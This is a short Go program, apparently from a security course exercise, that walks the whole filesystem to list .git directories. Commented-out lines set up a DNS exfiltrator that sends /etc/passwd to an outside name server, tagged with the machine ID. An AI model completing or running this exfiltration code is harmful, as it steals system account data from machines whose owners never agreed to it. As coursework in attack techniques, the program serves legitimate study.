package main

import (
	"errors"
	"fmt"
	"io/fs"
	"log"
	"path/filepath"
	"strings"
)

const (
	NAME_SERVER = "cs5231.ianyong.com"
	DELAY       = 200
)

func walk(path string, info fs.FileInfo, err error) error {
	if err != nil {
		if errors.Is(err, fs.ErrPermission) {
			return nil
		}
		if strings.HasPrefix(path, "/proc") {
			return nil
		}
		return err
	}
	if info.IsDir() && info.Name() == ".git" {
		fmt.Println(path)
	}
	return nil
}

func main() {
	// machineId, err := machineid.ID()
	// if err != nil {
	// 	log.Fatalln(err)
	// }

	err := filepath.Walk("/", walk)
	if err != nil {
		log.Println(err)
	}

	// dnsExfiltrator := exfiltrator.NewDnsExfiltrator(NAME_SERVER, machineId, DELAY)
	// dnsExfiltrator.ExfiltrateFile("/etc/passwd")
}
